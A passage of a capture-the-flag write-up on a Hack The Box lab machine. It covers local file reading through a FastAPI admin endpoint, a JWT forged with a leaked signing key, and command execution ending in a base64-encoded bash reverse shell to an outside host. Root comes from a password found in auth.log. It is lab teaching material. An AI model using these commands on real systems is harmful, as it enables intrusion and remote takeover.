class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/admin/file <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"file":"/home/htb/uhc/app/main.py"}'</span> <span class="token operator">|</span> jq <span class="token string">'.file'</span> <span class="token parameter variable">-r</span> <span class="token operator">&gt;</span> main.py
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128182228.png" src="img/pasted-image-20251128182228.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128182228.png" src="img/pasted-image-20251128182228.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the file was successfully formatted, a line appeared that mentioned the path of a configuration file located under <code>/app/core</code>. Therefore, this path will be appended to <code>/home/htb/uhc</code> in order to list its contents:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/admin/file <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;jwt&gt;"</span> <span class="token parameter variable">-H</span> <span class="token string">"content-type: application/json"</span> <span class="token parameter variable">-d</span> <span class="token string">'{"file":"/home/htb/uhc/app/core/config.py"}'</span> <span class="token operator">|</span> jq <span class="token string">'.file'</span> <span class="token parameter variable">-r</span> <span class="token operator">&gt;</span> config.py
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128182432.png" src="img/pasted-image-20251128182432.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128182432.png" src="img/pasted-image-20251128182432.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Finally, the file contained the <code>JWT</code> secret key used to sign the tokens. With this key, a new <code>JWT</code> will be created that includes the <code>debug</code> field:</p></div><div class="el-h2"><h2 data-heading="Creating a Privileged JWT Using the Obtained Secret Key" dir="auto" class="heading" id="Creating_a_Privileged_JWT_Using_the_Obtained_Secret_Key_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Creating a Privileged JWT Using the Obtained Secret Key</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">python3 jwt_tool.py <span class="token string">'&lt;jwt&gt;'</span> <span class="token parameter variable">-T</span> <span class="token parameter variable">-S</span> hs256 <span class="token parameter variable">-p</span> <span class="token string">'SuperSecretSigningKey-HTB'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128183510.png" src="img/pasted-image-20251128183510.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128183510.png" src="img/pasted-image-20251128183510.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128183522.png" src="img/pasted-image-20251128183522.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128183522.png" src="img/pasted-image-20251128183522.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Finally, the new privileged <code>JWT</code> containing the <code>debug</code> key was successfully generated and is now ready to be used with the <code>/admin/exec</code> endpoint to attempt command execution:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Abusing FastAPI – Remote Command Execution via the `/admin/exec` Endpoint Using a Generated JWT" dir="auto" class="heading" id="TCP_Port_80_Abusing_FastAPI_–_Remote_Command_Execution_via_the_`/admin/exec`_Endpoint_Using_a_Generated_JWT_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Abusing FastAPI – Remote Command Execution via the <code>/admin/exec</code> Endpoint Using a Generated JWT</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-s</span> http://10.10.11.161/api/v1/admin/exec/<span class="token string">'whoami'</span> <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer &lt;signed_jwt&gt;"</span>
<span class="token string">"htb"</span> 
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128183814.png" src="img/pasted-image-20251128183814.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128183814.png" src="img/pasted-image-20251128183814.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The remote command execution worked as expected. Therefore, a payload to establish a <code>reverse shell</code> will be sent. The <code>payload</code> cannot include spaces and must avoid special characters, so to ensure correct interpretation, a <code>Base64-encoded payload</code> will be used. The functionality is first demonstrated in a local example:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">nc</span> <span class="token parameter variable">-nlvp</span> <span class="token number">4444</span>
<span class="token builtin class-name">echo</span> <span class="token string">'L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjYvNDQ0NCAwPiYxJw=='</span><span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">bash</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128184741.png" src="img/pasted-image-20251128184741.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128184741.png" src="img/pasted-image-20251128184741.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">As shown in the image, the <code>payload</code> is first encoded to avoid special characters. It is then decoded and executed using <code>bash</code> through pipes. The <code>|</code> characters must also be <code>URL-encoded</code>, which corresponds to <code>%7C</code>, and spaces must be encoded as <code>%20</code>. With this in mind, the <code>payload</code> will be sent as follows:</p></div><div class="el-h2"><h2 data-heading="Initial Access" dir="auto" class="heading" id="Initial_Access_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Initial Access</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token string">'http://10.10.11.161/api/v1/admin/exec/echo%20L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjYvNDQ0NCAwPiYxJw==%7Cbase64%20-d%7Cbash'</span> <span class="token parameter variable">-H</span> "Authorization: Bearer <span class="token operator">&lt;</span>signed_jwt<span class="token operator">&gt;</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128185229.png" src="img/pasted-image-20251128185229.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128185229.png" src="img/pasted-image-20251128185229.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The payload worked and a <code>reverse shell</code> was successfully established, leading to the <code>post-exploitation</code> stage where the system will be enumerated to escalate privileges:</p></div><div class="el-h1"><h1 data-heading="Post-Exploitation" dir="auto" class="heading" id="Post-Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Post-Exploitation</h1></div><div class="el-h2"><h2 data-heading="User Flag" dir="auto" class="heading" id="User_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>User Flag</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128185322.png" src="img/pasted-image-20251128185322.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128185322.png" src="img/pasted-image-20251128185322.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the user flag was successfully displayed, the current directory will be listed next:</p></div><div class="el-h2"><h2 data-heading="Privilege Escalation" dir="auto" class="heading" id="Privilege_Escalation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Privilege Escalation</h2></div><div class="el-h3"><h3 data-heading="Information Leakage – Password Found in `auth.log`" dir="auto" class="heading" id="Information_Leakage_–_Password_Found_in_`auth.log`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Information Leakage – Password Found in <code>auth.log</code></h3></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128185621.png" src="img/pasted-image-20251128185621.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128185621.png" src="img/pasted-image-20251128185621.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">There was an <code>auth.log</code> file containing an authentication entry that indicated a potential password. This likely occurred because a user accidentally entered the password in the username field and the username in the password field. As a result, the password leaked, and it can now be used to attempt access to the root account:</p></div><div class="el-h2"><h2 data-heading="Root Flag" dir="auto" class="heading" id="Root_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Root Flag</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251128185609.png" src="img/pasted-image-20251128185609.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251128185609.png" src="img/pasted-image-20251128185609.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The password worked and the root flag was displayed. Finally, the target machine was successfully pwned!</p></div><div class="el-h1"><h1 data-heading="References" dir="auto" class="heading" id="References_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>References</h1></div><div class="el-p"><p dir="auto"><strong>Penelope</strong> -&gt; <a data-tooltip-position="top" aria-label="https://github.com/brightio/penelope" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/brightio/penelope" target="_self">Link</a><br>
<strong>JWT tool</strong> -&gt; <a data-tooltip-position="top" aria-label="https://github.com/ticarpi/jwt_tool" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/ticarpi/jwt_tool" target="_self">Link</a><br>
<strong>jwt.io</strong> -&gt; <a data-tooltip-position="top" aria-label="https://www.jwt.io/" rel="noopener nofollow" class="external-link is-unresolved" href="https://www.jwt.io/" target="_self">Link</a></p></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"><div id="right-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="right-sidebar-content" class="leaf-content"><div id="outline" class=" tree-container"><div class="feature-header"><div class="feature-title">Table Of Contents</div><button class="clickable-icon nav-action-button tree-collapse-all" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-item" data-depth="1"><a class="tree-item-self is-clickable" href="machine-backend.html#Machine_Backend_0" data-path="#Machine_Backend_0"><div class="tree-item-inner heading-link" heading-name="Machine Backend">Machine Backend</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-backend.html#Information_Gathering_0" data-path="#Information_Gathering_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Information Gathering">Information Gathering</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#Discovering_OS_via_TTL_Using_`ping`_0" data-path="#Discovering_OS_via_TTL_Using_`ping`_0"><div class="tree-item-inner heading-link" heading-name="Discovering OS via TTL Using `ping`">Discovering OS via TTL Using <code>ping</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#UDP_Port_Scan_Using_`nmap`_0" data-path="#UDP_Port_Scan_Using_`nmap`_0"><div class="tree-item-inner heading-link" heading-name="UDP Port Scan Using `nmap`">UDP Port Scan Using <code>nmap</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0" data-path="#TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port Scan Using a Custom `.zshrc` Function (`jmap`)">TCP Port Scan Using a Custom <code>.zshrc</code> Function (<code>jmap</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0" data-path="#Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0"><div class="tree-item-inner heading-link" heading-name="Represent Scan Information Legibly Using  a `.zshrc` Custom Function (`extractPorts`)">Represent Scan Information Legibly Using  a <code>.zshrc</code> Custom Function (<code>extractPorts</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0" data-path="#Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0"><div class="tree-item-inner heading-link" heading-name="Discovering Service Versions on Open TCP Ports Using a `.zshrc` Custom Function (`jmap2`)">Discovering Service Versions on Open TCP Ports Using a <code>.zshrc</code> Custom Function (<code>jmap2</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_80_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0" data-path="#TCP_Port_80_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Identifying Technologies and Services on the Web Service Using `whatweb` &amp; `wappalyzer`">TCP Port 80: Identifying Technologies and Services on the Web Service Using <code>whatweb</code> &amp; <code>wappalyzer</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_80_Discovering_Routes_and_Resources_Using_`dirsearch`_0" data-path="#TCP_Port_80_Discovering_Routes_and_Resources_Using_`dirsearch`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Discovering Routes and Resources Using `dirsearch`">TCP Port 80: Discovering Routes and Resources Using <code>dirsearch</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_80_API_Enumeration_Using_Web_Fuzzing_0" data-path="#TCP_Port_80_API_Enumeration_Using_Web_Fuzzing_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: API Enumeration Using Web Fuzzing">TCP Port 80: API Enumeration Using Web Fuzzing</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-backend.html#Exploitation_0" data-path="#Exploitation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Exploitation">Exploitation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_80_Abusing_API_-_Registering_a_New_User_0" data-path="#TCP_Port_80_Abusing_API_-_Registering_a_New_User_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Abusing API - Registering a New User">TCP Port 80: Abusing API - Registering a New User</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_80_Abusing_API_–_Logging_in_as_the_Created_User_0" data-path="#TCP_Port_80_Abusing_API_–_Logging_in_as_the_Created_User_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Abusing API – Logging in as the Created User">TCP Port 80: Abusing API – Logging in as the Created User</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_80_Using_the_Generated_JWT_to_Read_the_`openapi.json`_(API_Schema)_0" data-path="#TCP_Port_80_Using_the_Generated_JWT_to_Read_the_`openapi.json`_(API_Schema)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Using the Generated JWT to Read the `openapi.json` (API Schema)">TCP Port 80: Using the Generated JWT to Read the <code>openapi.json</code> (API Schema)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_80_Abusing_FastAPI_–_Changing_the_Admin_Password_Using_the_Obtained_GUID_0" data-path="#TCP_Port_80_Abusing_FastAPI_–_Changing_the_Admin_Password_Using_the_Obtained_GUID_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Abusing FastAPI – Changing the Admin Password Using the Obtained GUID">TCP Port 80: Abusing FastAPI – Changing the Admin Password Using the Obtained GUID</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_80_Abusing_FastAPI_–_Logging_in_as_the_Admin_User_Using_the_Changed_Password_0" data-path="#TCP_Port_80_Abusing_FastAPI_–_Logging_in_as_the_Admin_User_Using_the_Changed_Password_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Abusing FastAPI – Logging in as the Admin User Using the Changed Password">TCP Port 80: Abusing FastAPI – Logging in as the Admin User Using the Changed Password</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_80_Abusing_FastAPI_–_Reading_Local_Files_(LFI)_Through_the_`/admin/file`_Endpoint_0" data-path="#TCP_Port_80_Abusing_FastAPI_–_Reading_Local_Files_(LFI)_Through_the_`/admin/file`_Endpoint_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Abusing FastAPI – Reading Local Files (LFI) Through the `/admin/file` Endpoint">TCP Port 80: Abusing FastAPI – Reading Local Files (LFI) Through the <code>/admin/file</code> Endpoint</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#Creating_a_Privileged_JWT_Using_the_Obtained_Secret_Key_0" data-path="#Creating_a_Privileged_JWT_Using_the_Obtained_Secret_Key_0"><div class="tree-item-inner heading-link" heading-name="Creating a Privileged JWT Using the Obtained Secret Key">Creating a Privileged JWT Using the Obtained Secret Key</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#TCP_Port_80_Abusing_FastAPI_–_Remote_Command_Execution_via_the_`/admin/exec`_Endpoint_Using_a_Generated_JWT_0" data-path="#TCP_Port_80_Abusing_FastAPI_–_Remote_Command_Execution_via_the_`/admin/exec`_Endpoint_Using_a_Generated_JWT_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80: Abusing FastAPI – Remote Command Execution via the `/admin/exec` Endpoint Using a Generated JWT">TCP Port 80: Abusing FastAPI – Remote Command Execution via the <code>/admin/exec</code> Endpoint Using a Generated JWT</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#Initial_Access_0" data-path="#Initial_Access_0"><div class="tree-item-inner heading-link" heading-name="Initial Access">Initial Access</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-backend.html#Post-Exploitation_0" data-path="#Post-Exploitation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Post-Exploitation">Post-Exploitation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#User_Flag_0" data-path="#User_Flag_0"><div class="tree-item-inner heading-link" heading-name="User Flag">User Flag</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-item-self is-clickable mod-collapsible" href="machine-backend.html#Privilege_Escalation_0" data-path="#Privilege_Escalation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Privilege Escalation">Privilege Escalation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-backend.html#Information_Leakage_–_Password_Found_in_`auth.log`_0" data-path="#Information_Leakage_–_Password_Found_in_`auth.log`_0"><div class="tree-item-inner heading-link" heading-name="Information Leakage – Password Found in `auth.log`">Information Leakage – Password Found in <code>auth.log</code></div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-backend.html#Root_Flag_0" data-path="#Root_Flag_0"><div class="tree-item-inner heading-link" heading-name="Root Flag">Root Flag</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-item-self is-clickable" href="machine-backend.html#References_0" data-path="#References_0"><div class="tree-item-inner heading-link" heading-name="References">References</div></a><div class="tree-item-children"></div></div></div></div></div><script defer="">let rs = document.querySelector("#right-sidebar"); rs.classList.toggle("is-collapsed", window.innerWidth < 768); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></div></div></body></html>